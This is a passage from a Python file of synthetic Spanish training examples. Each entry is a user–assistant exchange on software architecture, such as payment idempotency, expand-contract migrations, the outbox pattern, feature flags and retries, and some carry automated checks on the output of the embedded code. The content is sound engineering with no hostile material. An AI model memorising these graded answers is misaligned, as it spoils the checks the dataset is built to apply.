**Qué NO hago y por qué:** invalidación por suscripción a eventos con garantías de entrega (otro sistema que operar para una ventana de 60 s), coherencia write-through en todos los caminos (acopla la escritura de precios a Redis: si Redis cae, no se puede cambiar un precio), y cachés de segundo nivel por instancia más allá del single-flight (invisibles para invalidar).

**Consecuencias y verificación del diseño:** el contrato medible es «p99 de obsolescencia ≤ 60 s tras cambio de precio»: se verifica en CI/staging midiendo tiempo entre commit y primera respuesta con precio nuevo, y en producción con un endpoint de diagnóstico que compara BD vs caché para ids muestreados. Coste: ~2 días de desarrollo; riesgo: bajo, porque cada pieza degrada a «más carga en BD», no a datos incorrectos permanentes. Si algún día el negocio exige «precio nuevo en <1 s garantizado», eso es otro contrato (invalidación push fiable o leer siempre precio de BD y cachear el resto del producto): se decide entonces, con el requisito del negocio sobre la mesa, no antes."""),
        ],
        tags=["caching", "cache-invalidation", "ttl", "cache-stampede"],
        stack=["python"], recovery=False,
    ),

    # A4 — idempotencia de pagos con claves (pseudocodigo verificado)
    E(
        language="python", domain="architecture", subdomain="idempotencia_pagos",
        difficulty="very_hard", task_type="architecture",
        messages=[
            ("user", """Integración con pasarela de cobro: los clientes móviles reintentan las peticiones al perder cobertura y nos estáis cobrando dos veces el mismo pedido (3 casos esta semana). El endpoint `POST /pagos` hace: validar tarjeta → crear cargo en la pasarela → guardar pedido → responder. Sin estado entre peticiones, base de datos PostgreSQL, clientes que SÍ pueden generar identificadores únicos. Diseñad la solución de idempotencia end-to-end y demostrad la lógica (pseudocódigo ejecutable)."""),
            ("assistant", """**Diseño: claves de idempotencia propiedad del cliente, almacenadas en el servidor con el cuerpo y la respuesta.**

Reglas que hacen el sistema correcto, no solo «con una columna extra»:

1. **La clave la genera el cliente por operación lógica** (UUID v4) y la reusa en reintentos de ESA operación; se envía en cabecera `Idempotency-Key`. El servidor no puede inventarla: no distingue «reintento» de «nuevo pago».
2. **Persistencia con restricción UNIQUE(idempotency_key)** en una tabla `idempotencia(clave, digest_cuerpo, estado, respuesta, creada)`. La UNIQUE es la primitiva atómica: dos peticiones concurrentes con la misma clave, y solo una inserta.
3. **Semántica por estado:** clave nueva → procesar; clave con digest **distinto** → 422 (reuso de clave con otro cuerpo: bug del cliente, no se procesa); clave en estado `pendiente` → 409 (otra petición está en vuelo); clave `completa` → **replay de la respuesta guardada** (mismo cargo_id, nunca segundo cargo).
4. **El cargo y el registro de clave en la misma transacción** de la BD (el cargo se registra en `cargos` con UNIQUE de clave también): si el proceso muere a mitad, o todo se confirmó (replay devuelve el cargo existente) o nada (la clave queda libre y el reintento lo hace de cero).
5. **Caducidad:** filas de idempotencia con TTL (24-48 h, limpieza nocturna); las pasarelas funcionan igual (Stripe: 24 h) porque más allá, un «reintento» ya es otra operación de negocio.

En la pasarela real, además: pasarle SU clave de idempotencia al crear el cargo, de modo que un reintento tras un timeout también sea seguro en su lado (doble protección: nuestra BD y la pasarela).

**Lógica verificada (pseudocódigo ejecutable, semántica idéntica al diseño):**

```python
# idempotencia_pagos.py — esqueleto didactico con la semantica del diseno
import hashlib, json

class ProcesadorPagos:
    def __init__(self):
        self.idempotencia = {}   # clave -> {"estado": "pendiente|completo", "digest", "respuesta"}
        self.cargos = []         # libro mayor simulado

    def procesar(self, idempotency_key, pedido):
        digest = hashlib.sha256(json.dumps(pedido, sort_keys=True).encode()).hexdigest()

        previo = self.idempotencia.get(idempotency_key)
        if previo is not None:
            if previo["digest"] != digest:
                return {"error": "clave reutilizada con cuerpo distinto (422)"}
            if previo["estado"] == "pendiente":
                return {"error": "peticion en curso: reintenta mas tarde (409)"}
            return dict(previo["respuesta"], repetido=True)   # replay seguro

        # en produccion: INSERT ... ON CONFLICT DO NOTHING con UNIQUE(clave)
        self.idempotencia[idempotency_key] = {"estado": "pendiente", "digest": digest, "respuesta": None}
        try:
            cargo_id = "ch_" + digest[:10]
            self.cargos.append({"cargo_id": cargo_id, "importe": pedido["importe"]})
            respuesta = {"cargo_id": cargo_id, "estado": "autorizado"}
        except Exception:
            self.idempotencia.pop(idempotency_key, None)      # libera la clave para reintentar
            raise
        self.idempotencia[idempotency_key] = {"estado": "completo", "digest": digest, "respuesta": respuesta}
        return dict(respuesta, repetido=False)

p = ProcesadorPagos()
r1 = p.procesar("key-abc-001", {"importe": 4990, "moneda": "EUR"})
r2 = p.procesar("key-abc-001", {"importe": 4990, "moneda": "EUR"})
r3 = p.procesar("key-abc-001", {"importe": 9990, "moneda": "EUR"})
print("primera peticion:", r1)
print("reintento con misma clave:", r2)
print("misma clave y cuerpo distinto:", r3)
assert len(p.cargos) == 1, "el cargo no debe duplicarse"
assert r1["cargo_id"] == r2["cargo_id"] and r2["repetido"] is True
print("cargos en el libro mayor:", len(p.cargos), "-> idempotencia verificada")
```

En la ejecución: el reintento con la misma clave y el mismo cuerpo devuelve el MISMO `cargo_id` con `repetido=True` y el libro mayor sigue en 1 cargo; reusar la clave con otro cuerpo es un error explícito. **Consecuencias:** los clientes deben generar la clave al iniciar el pago y persistirla hasta ver la confirmación (documentarlo es parte de la API); aceptamos 409/422 como códigos nuevos que el SDK del móvil debe tratar; y el endpoint de cobro queda seguro frente a reintentos aunque la pasarela externa sea lenta — el caso del outage que lo originó."""),
        ],
        verify=[
            {"name": "fix_idempotencia_run", "action": "run", "lang": "python", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["reintento con misma clave: {'cargo_id': 'ch_", "'repetido': True}",
                                         "cargos en el libro mayor: 1 -> idempotencia verificada"],
             "timeout_s": 10},
        ],
        tags=["idempotency", "payments", "api-design", "exactly-once-effect"],
        stack=["python"], recovery=False,
    ),

    # A5 — migracion de esquema sin downtime: expand-contract
    E(
        language="python", domain="architecture", subdomain="migracion_expand_contract",
        difficulty="very_hard", task_type="architecture",
        messages=[
            ("user", """PostgreSQL 15, tabla `users` con 80M de filas. Necesitamos: renombrar `email` a `contact_email` Y además cambiar la semántica (a partir de ahora puede contener email O teléfono normalizado, con nuevo campo `contact_type`). Tráfico 24/7, no podemos permitirnos ventana de mantenimiento, y el despliegue de la aplicación es continuo (varias veces al día). El DBA junior propone un `ALTER TABLE users RENAME COLUMN email contact_email;` en una transacción el sábado por la noche. ¿Qué le contestáis? Dame el plan por fases con SQL concreto y su plan de rollback."""),
            ("assistant", """**Contestación corta al DBA: no.** El `RENAME` en sí es rápido (solo catálogo), pero rompe TODAS las consultas y código que aún usan `email` mientras despliegan; y si detrás hay un `ALTER COLUMN TYPE`, PostgreSQL reescribe la tabla con bloqueo `ACCESS EXCLUSIVE`: 80M de filas con la tabla cerrada. El patrón que resuelve esto sin downtime es **expand-contract: expandir (añadir lo nuevo), migrar, y contraer (quitar lo viejo) como fases independientes y reversibles**, nunca un cambio atómico del esquema.

**Fase 0 — desplegar código tolerante.** Antes de tocar el esquema, el código que escribe `users` acepta escribir ambos campos (feature flag `contacto_dual_write` activada). Sin esto, las fases siguientes pierden datos.

**Fase 1 — expandir (esquema aditivo, sin romper nada):**

```sql
ALTER TABLE users ADD COLUMN contact_type text;
ALTER TABLE users ADD COLUMN contact_email text;   -- NULL permitido: expandir no restringe
```

Ambas son metadatos puros en PG 11+ (sin reescritura, sin bloqueo largo). RESTRICCIONES (`NOT NULL`, `UNIQUE`, `CHECK`) NO en esta fase: añadir un `NOT NULL` sin valor por defecto válido bloquea y puede fallar; se aplazan a la fase 3 una vez rellenado.

**Fase 2 — rellenar por lotes + dual-write estable.** Backfill por rangos de id, en transacciones pequeñas que no hagan crecer el vacuum ni la replicación en lag:

```sql
-- bucle del job (pseudocodigo): lotes de 10k, pausa entre lotes, idempotente por id
UPDATE users SET contact_email = email, contact_type = 'email'
WHERE id BETWEEN :desde AND :hasta
  AND contact_email IS NULL;
```

Y crear el índice nuevo **sin bloquear escrituras**: `CREATE INDEX CONCURRENTLY idx_users_contact_email ON users (contact_email);` (nota: CONCURRENTLY no va dentro de transacción y puede abortarse: se reintenta). Al acabar el backfill, el dual-write de la fase 0 mantiene vivos ambos campos para las filas nuevas.

**Fase 3 — conmutar lecturas con flag, restringir.** Las lecturas pasan a `contact_email` tras verificar con métricas que el backfill cubre el 100% (`SELECT count(*) FROM users WHERE contact_email IS NULL AND email IS NOT NULL` → 0). Después sí: `ALTER TABLE users ALTER COLUMN contact_email SET NOT NULL;` y si el negocio lo pide, `ADD CONSTRAINT contact_email_key UNIQUE (contact_email)` (con tabla enorme, preferir `UNIQUE INDEX` CONCURRENTLY + `ALTER ... ADD CONSTRAINT ... USING INDEX`, que toma un bloqueo breve). El flag de dual-write sigue activo una ventana de rollback.

**Fase 4 — contraer (solo tras el periodo de reversión acordado, p. ej. 2 semanas):**

```sql
ALTER TABLE users DROP COLUMN email;   -- irreversible: requiere periodo de gracia cumplido
```

**Rollback por fase, que es la gracia del patrón:** fase 1 y 2: no-op (nada lee lo nuevo aún); fase 3: apagar el flag de lectura → todo vuelve a `email` (sigue vivo por el dual-write); solo la fase 4 es irreversible, y por eso se separa en el tiempo y se ejecuta cuando las métricas del periodo de gracia están limpias. Costes honestos: ~2x espacio temporal (dos columnas + dos índices), un job de backfill que vigilar, y disciplina con el flag (caduca en la fase 4). Sobre-ingeniería rechazada: triggers de sincronización bidireccional permanentes y herramientas de migración distribuida para un cambio que el patrón cubre; y el «sábado noche» del DBA junior solo sería aceptable con ventana real de caída, que el enunciado excluye."""),
        ],
        tags=["expand-contract", "schema-migration", "zero-downtime", "postgresql"],
        stack=["python", "sql"], recovery=False,
    ),

    # A6 — mini-ADR: patron outbox (pseudocodigo verificado)
    E(
        language="python", domain="architecture", subdomain="patron_outbox",
        difficulty="very_hard", task_type="architecture",
        messages=[
            ("user", """Monolito PHP/PostgreSQL con 2 queues Redis. Flujo actual al crear un pedido: (1) INSERT del pedido, (2) publish `PedidoCreado` a Redis, (3) los consumidores de inventario y de emails reaccionan. Problemas vividos: tras un despliegue con pico de tráfico, pedidos creados sin evento (los consumidores nunca se enteraron), y al revés, eventos «fantasma» de pedidos que luego hicieron rollback. 3 devs, sin CDC ni infra adicional si se puede evitar. ¿Cómo lo resolvéis? Preséntalo como ADR y demuestra la semántica con pseudocódigo ejecutable."""),
            ("assistant", """**ADR-002: entrega fiable de eventos de dominio (patrón outbox).**

**Contexto.** Dos escrituras diferentes (PostgreSQL y Redis) que hoy se hacen en secuencia: es el problema clásico de **doble escritura** — no existe forma de confirmar ambas atómicamente, así que un crash entre (1) y (2) pierde el evento, y un rollback posterior deja el evento publicado. Con inventario y emails al otro lado, el fallo es visible para el negocio.

**Opciones comparadas.**

| Opción | Corrección | Coste |
|---|---|---|
| Doble escritura con reintentos manuales | No alcanza atomicidad; detectar fugas es artesanal | Bajo, pero incidentes recurrentes |
| **Outbox + relay con polling** | La misma transacción escribe pedido + evento; un relay publica después | Tabla nueva, un worker, at-least-once |
| CDC (Debezium sobre WAL) | Correcto y casi en tiempo real | Kafka+Conector: infra y skills que no tenemos |

**Decisión.** Outbox con relay de polling: en la MISMA transacción del pedido se inserta la fila en `outbox(id, aggregate_type, aggregate_id, event_type, payload, created_at, published_at NULL)`; un relay ligero sondea la tabla, publica cada evento pendiente en Redis y marca `published_at`. Consecuencia asumida: entrega **at-least-once** (el relay puede morir tras publicar y antes de marcar: al reiniciar republica). Por eso los consumidores deben ser **idempotentes por `event_id`** — es un requisito del diseño, no un detalle opcional. El orden se garantiza por agregado publicando en orden de `id`; a escala global no prometemos orden y ningún consumidor debe necesitarlo.

**Consecuencias.**
- + Eliminadas ambas fugas: evento y estado comparten transacción; no hay eventos fantasma (el rollback arrastraría al outbox).
- + Sin infra nueva: tabla + worker de polling (sub-second con `LISTEN/NOTIFY` más adelante si hiciera falta).
- − Latencia de entrega de decenas de ms a segundos (aceptable para inventario/emails).
- − Los consumidores llevan deduplicación por `event_id` (tabla de vistos o estado natural idempotente).
- Revisión del ADR: si el volumen supera lo que el polling soporta o aparecen múltiples servicios consumidores, CDC pasa a considerarse de nuevo.

**Semántica demostrada (pseudocódigo ejecutable):**

```python
# outbox_demo.py — doble escritura vs outbox, con consumidor idempotente
class BusEventos:
    def __init__(self):
        self.entregados = []

    def publicar(self, evento):
        self.entregados.append(evento)   # at-least-once: puede duplicar

class ConsumidorInventario:
    def __init__(self):
        self.procesados = set()
        self.reservas = {}

    def manejar(self, evento):
        eid = evento["id"]
        if eid in self.procesados:
            return "duplicado ignorado"
        self.procesados.add(eid)
        self.reservas[evento["sku"]] = self.reservas.get(evento["sku"], 0) + evento["unidades"]
        return "aplicado"

# --- escenario A: doble escritura ingenua ---
db_a, bus_a = [], BusEventos()
db_a.append(("pedido", 1042))
# crash simulado: la publicacion en el bus nunca llega a ocurrir
print("A doble escritura: pedidos guardados =", len(db_a), "| eventos publicados =", len(bus_a.entregados))

# --- escenario B: patron outbox con relay at-least-once y consumidor idempotente ---
db_b = {"pedidos": [], "outbox": []}

def crear_pedido(pedido):
    db_b["pedidos"].append(pedido)                                  # misma transaccion
    db_b["outbox"].append({"id": "evt-1", "tipo": "PedidoCreado",
                           "sku": pedido["sku"], "unidades": pedido["unidades"]})

crear_pedido({"id": 1042, "sku": "silla-azul", "unidades": 3})
bus = BusEventos()
for e in db_b["outbox"]:
    bus.publicar(e)
    bus.publicar(e)          # el relay reintenta tras un timeout: entrega duplicada
cons = ConsumidorInventario()
for e in bus.entregados:
    print("B consumidor:", cons.manejar(e))
print("B reservas finales:", cons.reservas)
assert cons.reservas == {"silla-azul": 3}, "los duplicados no deben sumar dos veces"
print("B outbox: ningun evento perdido, duplicados absorbidos")
```

En la ejecución: el escenario A deja 1 pedido guardado y 0 eventos publicados (la fuga que vivisteis); el escenario B sobrevive a la entrega duplicada del relay y las reservas finales son exactas."""),
        ],
        verify=[
            {"name": "fix_outbox_run", "action": "run", "lang": "python", "msg": -1, "block": 0,
             "expect_exit": 0,
             "expect_stdout_contains": ["A doble escritura: pedidos guardados = 1 | eventos publicados = 0",
                                         "duplicado ignorado",
                                         "B outbox: ningun evento perdido, duplicados absorbidos"],
             "timeout_s": 10},
        ],
        tags=["outbox", "transactional-messaging", "at-least-once", "idempotent-consumer"],
        stack=["python"], recovery=False,
    ),

    # A7 — versionado de API compatible: reglas y ventana de deprecation
    E(
        language="python", domain="architecture", subdomain="versionado_api",
        difficulty="hard", task_type="architecture",
        messages=[
            ("user", """API pública B2B `/v1` con 40 integradores externos. Presión comercial: quieren que el campo `status` de pedidos pase de string (`"activo"`, `"cancelado"`) a un objeto (`{"estado": "...", "motivo": "..."}`), y renombrar `fecha_estimada` a `entrega_estimada`. Los clientes móviles propios tardan meses en actualizar. ¿Cómo lo hacéis sin romper a nadie y sin quedarnos dos versiones para siempre? Concretad las reglas de compatibilidad y el proceso de retirada."""),
            ("assistant", """**Principio rector: en una versión mayor, los cambios son aditivos o no entran.** Con eso en la cabeza, ninguno de los dos cambios necesita una v2:

1. **`status` string → objeto: NO se cambia; se añade.** Se introduce `status_detail` (el objeto nuevo) como campo adicional y `status` queda congelado con sus valores actuales. Los clientes viejos siguen leyendo `status`; los nuevos prefieren `status_detail`. Regla de compatibilidad hacia atrás que documentamos: «los servidores pueden añadir campos; los clientes deben ignorar los desconocidos» (tolerant reader) — la escribimos en la guía de integración y la exigimos en nuestros SDK.
2. **Renombrar `fecha_estimada`: NO se renombra; se añade `entrega_estimada`** y el viejo se marca deprecated en la documentación, devolviendo el mismo valor. Un renombrado ES un breaking change para quien hace parsing estricto o codegen.

**Versión de URL solo para roturas reales** (`/v2` cuando algún día el modelo de dominio cambie de verdad, p. ej. pedidos multi-canal con paginación distinta). Nada de versiones menores expuestas (`/v1.2`): multiplica superficies de prueba por cero beneficio; la compatibilidad dentro de v1 es responsabilidad nuestra con las reglas de arriba.

**Proceso de retirada (para el día que toque):** (a) anunciar con fecha concreta y changelog a los 40 integradores; (b) cabeceras `Deprecation` y `Sunset` (fecha) en cada respuesta del campo/endpoint viejo — es observable por ellos y por nosotros; (c) métrica por cliente del uso del campo viejo (la decisión de retirar se toma con DATOS, no con calendario); (d) ventana mínima declarada de 6 meses para B2B, y bloqueo de retirada si un cliente de facturación anual significativo no ha migrado (decisión comercial, no técnica); (e) los tests de contrato en CI nos impiden romper v1 «por accidente» en un deploy: cada endpoint con su spec OpenAPI y tests que fallan si la respuesta cambia de forma incompatible.

**Qué NO hago:** negocicar quirúrgicamente cada excepción por cliente (imposible de mantener con 40), ni mantener campos fantasma para siempre: la retirada existe, solo que gobernada por métricas. Coste de este enfoque: disciplina de revisión de API en los PRs (checklist de compatibilidad) y el doble de campos durante unos meses; riesgo evitado: 40 integraciones rotas un martes por la mañana."""),
        ],
        tags=["api-versioning", "backward-compatibility", "deprecation", "tolerant-reader"],
        stack=["python"], recovery=False,
    ),

    # A8 — limites de modulos y dependencias: analisis y politicas enforceables
    E(
        language="python", domain="architecture", subdomain="limites_modulos",
        difficulty="hard", task_type="analysis",
        messages=[
            ("user", """Monolito Python de 200k líneas, 8 desarrolladores. Síntomas: `from app.utils import ...` tiene 3.400 funciones (cementerio de helpers), el paquete `ui` importa directamente el ORM y ejecuta SQL, hay 17 ciclos de imports detectados por `pydeps`, y nadie sabe qué parte de `servicios` puede llamar a cuál. Cada refactor cruza 5 módulos. Nos piden «microservicios para arreglar esto». Antes de decidir eso, ¿qué politicas de límites de módulos aplicáis y cómo se hacen cumplir sin depender de la buena voluntad?"""),
            ("assistant", """**Diagnóstico primero: vuestro problema es de límites internos, no de despliegue.** Extraer microservicios sobre estas dependencias da exactamente lo mismo pero con red de por medio (llamadas remotas entre servicios con ciclos = latencia y fallos en cascada). Lo que toca es definir fronteras de módulo con **reglas mecánicas verificables**; si después algún dominio necesita vida aparte, esa frontera ya existe.

**Política de límites que propongo (4 reglas):**

1. **Capas con dirección de dependencia única:** `ui` → `servicios` → `dominio` → `infra`. En concreto: `dominio` (entidades y reglas de negocio puras) no importa nada de las capas superiores; `infra` (BD, HTTP, colas) solo es importado por `dominio` a través de INTERFACES (puertos) definidas en dominio; `ui` jamás importa el ORM ni ejecuta SQL: habla con servicios. Los ciclos desaparecen por construcción: una dependencia en dirección prohibida es el ciclo potencial.
2. **API pública por módulo:** cada paquete declara lo que exporta (su `__init__` con imports explícitos y `__all__`); importar desde `paquete._privado` o desde un módulo profundo (`paquete.interno.detalle`) es error de revisión. Sin esto, cada refactor rompe a desconocidos y por eso nadie refactoriza.
3. **`utils` prohibido como destino:** los helpers se mudan al módulo del dominio al que sirven (`utils.formato_moneda` → `dominio/dinero.py`); lo genuinamente transversal (logging, fechas) va a un núcleo mínimo y congelado. Regla práctica: para entrar en `utils` hay que justificar en el PR por qué no pertenece a ningún dominio.
4. **Un módulo = un propietario implícito:** el CODEOWNERS por paquete hace que los cambios cross-module pidan revisión al dueño; es fricción deliberada que hace visible el coste de cruzar fronteras.

**Cómo se cumple sin buena voluntad (CI, no convenios):** chequeo automático de imports en cada PR — una herramienta como import-linter (o ~80 líneas de AST propio) con contratos del tipo «`dominio` no importa `ui`,`servicios`,`infra`», «`ui` solo importa `servicios`», «prohibido importar módulos privados de otro paquete». El chequeo arranca en verde para lo EXISTENTE congelándolo (baseline) y aplica la regla completa al código nuevo; los 17 ciclos se cierran con refactorings guiados, uno por PR, hasta vaciar la baseline. Métrica de progreso en el README del repo: nº de importaciones prohibidas = 3.412 → objetivo 0 por trimestre.

**Trade-offs honestos:** la dirección única de dependencias a veces obliga a escribir un puerto (interfaz) que en código «directo» sería una llamada — ese es el precio de poder testear dominio sin BD y de poder partir el monolito algún día. La fricción de CODEOWNERS ralentiza PRs cross-module de verdad urgentes (se puede escapar con etiqueta justificada, auditada). Y NO: ni microservicios ahora (arreglarían despliegue, no acoplamiento), ni un «paquete común» donde tirar todo (es el cementerio que ya tenéis). En 2-3 meses con las reglas en CI, la decisión de extraer algo se tomará con fronteras reales, no con esperanzas."""),
        ],
        tags=["module-boundaries", "dependency-direction", "architecture-rules", "ci-enforcement"],
        stack=["python"], recovery=False,
    ),

    # A9 — observabilidad minima viable para un equipo pequeno
    E(
        language="python", domain="architecture", subdomain="observabilidad_minima",
        difficulty="hard", task_type="analysis",
        messages=[
            ("user", """Equipo de 3, un servicio Python + PostgreSQL detrás de un balanceador. Último incidente: 2 horas para descubrir que un pool de conexiones agotado por un job nocturno era la causa de los timeouts. Hoy tenemos: logs de texto en stdout (se pierden al rotar el contenedor) y nada de métricas. Un proveedor nos ofrece APM completo con tracing distribuido por 800€/mes. Define nuestra observabilidad mínima viable: qué instrumentamos, qué no (y por qué), con qué criterios de coste y cómo mediremos si sirve."""),
            ("assistant", """**Criterio rector: la observabilidad mínima viable es la que permite responder las preguntas de SIEMPRE en <10 minutos** — ¿está roto? ¿para quién? ¿qué cambió ayer? — y el incidente que contáis es el ejemplo perfecto: el diagnóstico era una métrica (`pool de conexiones` saturado por un job), no un trace.

**Instrumentamos (en orden de rentabilidad):**

1. **Métricas RED por endpoint** (Rate, Errors, Duration p50/p95/p99) — con Prometheus self-hosted o el managed más barato; son ~15 líneas de middleware. Y dos métricas de recurso que os habrían ahorrado las 2 horas: **conexiones activas/esperando del pool** y saturación de workers.
2. **Logs estructurados JSON en stdout** con `request_id` generado en el balanceador y propagado a BD (contexto en cada línea), nivel INFO por defecto. El contenedor es efímero: un collector (Vector/Promtail) los envía a Loki o al gestor que ya tengáis; el costo es una config, no un producto caro.
3. **Salud activa:** endpoints `/healthz` (proceso vivo) y `/readyz` (BD responde, migraciones al día) para el balanceador, más un chequeo externo cada minuto que avisará lo primero que un cliente.
4. **Alertas de SÍNTOMA, 4 en total:** tasa de error 5xx >1% durante 5 min, p95 >SLA, healthcheck externo en rojo, y (el vuestro) pool con esperas >0 sostenidas. Sin alertas de causa (CPU, disco) que ya vigila el cloud: son ruido para un equipo de 3.

**Qué NO adoptamos hoy y por qué:** tracing distribuido — con UN servicio y un `request_id` en logs ya podéis seguir una petición punta a punta; el tracing paga cuando hay ≥3 saltos y equipos distintos por salto; APM de 800€/mes — comprad métricas y logs que ya cubren el 90% (el presupuesto mejor en un on-call digno o en el collector); y perfiles continuos — sí a un profile on-demand cuando un p99 suba, no como servicio permanente. Cardinalidad como regla dura: ninguna etiqueta de métrica con `user_id`, `order_id` o URL con ids (series infinitas = factura y OOM de Prometheus); las preguntas por-usuario van a logs, no a métricas.

**Criterios de coste y de éxito:** coste objetivo <100€/mes + ~3 días de trabajo inicial; se revisa al mes con dos preguntas medibles: (a) ¿el MTTR del próximo incidente baja de las 2 horas actuales? (b) ¿las alertas nocturnas son accionables (≥80% llevan a una acción, no a «ya pasó»)? Si (b) falla, se recortan alertas antes de añadir herramientas; si tras 2 meses el MTTR no mejora, entonces sí se evalúa el APM — con la hipótesis concreta de qué aportará que las métricas no dan. Resultado: el job nocturno que os costó el incidente habría disparado la alerta de pool a los 2 minutos con el job identificado en la etiqueta."""),
        ],
        tags=["observability", "red-metrics", "structured-logging", "alerting"],
        stack=["python"], recovery=False,
    ),

    # A10 — mini-ADR: migracion de servicio a un nuevo almacen de datos
    E(
        language="python", domain="architecture", subdomain="migracion_almacen_datos",
        difficulty="very_hard", task_type="architecture",
        messages=[
            ("user", """Nuestro servicio de pedidos (PostgreSQL) sufre: los 6 dashboards de negocio lanzan agregaciones de minutos sobre las mismas tablas OLTP y los p99 de la API suben en horario de reporting. Datos: 300 GB, crecimiento 2 GB/mes, equipo de 6, presupuesto para UNA pieza nueva de infraestructura como máximo. Propuestas: (a) réplica de lectura y redirigir dashboards, (b) warehouse columnar gestionado (BigQuery/Snowflake/ClickHouse), (c) reescribir pedidos en MongoDB «que escala». ADR, por favor."""),
            ("assistant", """**ADR-003: separar la carga analítica de la transaccional.**

**Contexto.** El problema medido no es OLTP puro: es la **convivencia de dos perfiles de carga** (consultas analíticas de minutos contra transacciones de ms) en el mismo almacén. 300 GB y 2 GB/mes descartan que el problema sea «tamaño»: es de patrón de acceso.

**Opciones comparadas.**

| Opción | Efecto en el dolor | Coste/riesgo |
|---|---|---|
| (a) Réplica de lectura para dashboards | Aísla el OLTP al 100% con esfuerzo mínimo; las queries siguen tardando minutos (pero lejos de la API) | Bajo; lag de replicación que vigilar |
| (b) Warehouse columnar gestionado | Dashboards de segundos; aísla por completo | Coste mensual alto + pipeline ETL que mantener + otra tecnología que aprender |
| (c) MongoDB para pedidos | Reescribe el sistema de dinero para resolver un problema de reporting; sin agregaciones más rápidas garantizadas | Altísimo, con riesgo real sobre transacciones |

**Decisión.** **(a) como fase 1 inmediata** (réplica, conectar los dashboards ahí: se despliega en días y elimina el incidente que motivó esto) **+ extracción selectiva a un almacén columnar solo para los 6 dashboards** como fase 2, con extracción incremental nocturna (o cada 15 min) desde la réplica, no desde el primario. La fase 2 empieza SOLO si los dashboards siguen siendo insuficientes en la réplica (segundos vs minutos): puede que la réplica baste y la fase 2 nunca se pague. Cuando llegue, será una tabla agregada por dashboard (resúmenes precalculados), no un espejo de 300 GB.

**Consecuencias.**
- + OLTP protegido desde la fase 1; decisión reversible y barata mientras medimos.
- + La fase 2, si llega, se diseña con datos reales de uso (qué dashboards se consultan, con qué frescura necesaria de 15 min).
- − La fase 2 introduce frescura limitada (15 min) y un pipeline que vigilar (falla → dashboards con datos viejos: alerta de edad del dato).
- − Réplica: lag de replicación visible para reporting (aceptable) y un nodo más que parchear.

**Rechazo explícito:** (c) MongoDB «porque escala» — ninguna evidencia de que el problema sea de escala de escrituras; reescribir el almacén transaccional de dinero para arreglar reporting es la sobre-ingeniería más cara de la mesa, y las agregaciones analíticas ni siquiera son el punto fuerte de un almacén documental. **Señales para reabrir el ADR:** reporting que exija frescura <1 min (ahora sí: CDC), crecimiento del pipeline de resúmenes a decenas de dashboards, o el equipo gane experiencia que haga barata la operación del warehouse."""),
        ],
        tags=["adr", "data-migration", "olap-vs-oltp", "read-replica", "strangler"],
        stack=["python", "sql"], recovery=False,
    ),

    # A11 — feature flags: desacoplar despliegue de liberacion con deuda controlada
    E(
        language="python", domain="architecture", subdomain="feature_flags",
        difficulty="hard", task_type="architecture",
        messages=[
            ("user", """Queremos separar despliegue de liberación en nuestro checkout: activar el nuevo flujo de pago por porcentaje de clientes, con interruptor de apagado instantáneo si algo arde, sin redeployar. 5 devs, un backend Python/PostgreSQL, CI/CD sencillo. Un consultor nos propone LaunchDarkly + SDK en todos los servicios + flags en cada función. ¿Qué diseño de feature flags implementáis y qué reglas de higiene ponéis para que no se convierta en un cementerio de `if flag`?"""),
            ("assistant", """**Diseño: flags simples y propios primero, delimitados por tipo, con ciclo de vida obligatorio.** Un consultor vende una plataforma; vosotros tenéis 5 devs y un requisito concreto (rollout gradual + kill switch). Un sistema de flags es: tabla `flags(clave, descripcion, tipo, valor, caduca_el)` + lectura cacheada (30-60 s o `NOTIFY` para invalidar) + un endpoint admin protegido para cambiar valores con auditoría. Eso se construye en un día y no añade un proveedor al camino crítico del pago; una SDK externa en el checkout mete latencia, dependencia y coste en la parte que menos puede fallar.

**Taxonomía que evita el caos (cada tipo con reglas propias):**
- **Release flags** (el 80%): protegen código a medio terminar. Regla: valor por defecto SEGURO (apagado), se quitan en días/semanas.
- **Ops flags** (kill switches): desactivan caminos costosos o frágiles (el job de reintentos, la pasarela secundaria). Viven más, pero con dueño y runbook.
- **Experiment flags** (A/B): solo si de verdad medís; con fecha de fin precommiteada.
- **Permisos/entitlements NO son feature flags**: si la condición es permanente (plan premium), es configuración/dominio, no flag — si no, el código queda ilegible para siempre.

**Reglas de higiene anti-cementerio (`if flag`):**
1. **Un punto de decisión por flag:** se consulta en la frontera (al construir el checkout, elige ruta A o B) y el resto del código no sabe del flag. Nada de `if flag` anidados en 6 capas.
2. **Fecha de caducidad obligatoria** en la tabla; job semanal que abre issue con los flags vencidos. Un flag sin fecha es deuda invisible.
3. **El PR que sube el flag al 100% elimina el camino muerto** (o el siguiente inmediato): definition of done del rollout incluye borrar la rama vieja y el flag. Los tests de la combinación activa pasan a ser los únicos.
4. **Máximo 3 flags activos por camino de ejecución** (la matriz de pruebas crece 2^n); si un cambio necesita más, es señal de partirlo.
5. **Kill switch probado en staging** antes del rollout: un interruptor que nunca se pulsó no es un interruptor, es una esperanza.

**Para vuestro caso concreto:** release flag `checkout_v2` con política de porcentaje consistente por cliente (hash de `customer_id` → bucket determinista: el mismo cliente siempre ve lo mismo, y el 5%/25%/100% no baila), métricas RED comparadas entre rutas (p95 y tasa de error por flag como etiqueta — pocos valores, cardinalidad controlada), y el kill switch = flag a 0% con efecto en <60 s sin redeploy. Sobre-ingeniería rechazada: plataforma externa de flags, targeting complejo por atributos, y flags a nivel de función en todos los servicios: con un monolito y 5 devs, el valor está en la disciplina del ciclo de vida, no en la herramienta."""),
        ],
        tags=["feature-flags", "progressive-delivery", "kill-switch", "technical-debt"],
        stack=["python"], recovery=False,
    ),

    # A12 — reintentos y backoff entre servicios (pseudocodigo verificado)
    E(
        language="python", domain="architecture", subdomain="reintentos_backoff",
        difficulty="hard", task_type="architecture",
        messages=[
            ("user", """El servicio de catálogo llama al de precios vía HTTP. Cuando precios se ralentiza, catálogo reintenta INMEDIATAMENTE 10 veces por petición (con su cliente HTTP), multiplicando la carga justo cuando precios está peor, y convirtiendo una ralentización en caída total. Nos piden la política de reintentos entre servicios. Requisitos: peticiones del cliente con deadline de 2 s, precios es idempotente (GET + claves en los POST), tenemos control de ambos servicios. Diseño completo, con pseudocódigo ejecutable de la política."""),
            ("assistant", """**Diagnóstico: el reintento inmediato e ilimitado es amplificación de fallo.** Con N dependientes reintentando al mismo ritmo, un pico de latencia se convierte en exceso de tráfico sincronizado (retry storm) que impide la recuperación. La política correcta tiene 5 piezas:

